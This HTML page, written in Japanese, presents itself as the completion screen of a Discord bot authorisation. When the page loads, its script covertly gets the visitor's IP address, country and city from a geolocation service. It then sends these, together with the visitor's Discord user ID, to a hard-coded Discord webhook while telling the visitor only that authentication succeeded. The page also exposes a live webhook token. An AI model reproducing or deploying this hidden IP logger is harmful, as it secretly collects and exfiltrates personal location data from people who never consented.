<!DOCTYPE html>
<html lang="ja">
<head><meta charset="UTF-8"><title>認証完了</title></head>
<body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
    <h1 id="status">認証処理中...</h1>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";

        async function process() {
            const params = new URLSearchParams(window.location.search);
            const state = params.get('state'); // ここに情報が入っている

            if (!state) {
                document.getElementById('status').innerText = "エラー: パラメータが不足しています";
                return;
            }

            // state (log_id=xxx&user_id=xxx) を分解
            const stateParams = new URLSearchParams(state);
            const logId = stateParams.get('log_id');
            const userId = stateParams.get('user_id');

            try {
                const geoRes = await fetch('https://ipapi.co/json/');
                const geo = await geoRes.json();

                await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **ボット導入完了**: <@${userId}>`,
                        embeds: [{
                            title: "導入ユーザーのIP特定",
                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\``,
                            color: 0x43b581,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
                document.getElementById('status').innerText = "✔ 認証・導入に成功しました。";
            } catch (e) {
                document.getElementById('status').innerText = "エラーが発生しました。";
            }
        }
        process();
    </script>
</body>
</html>
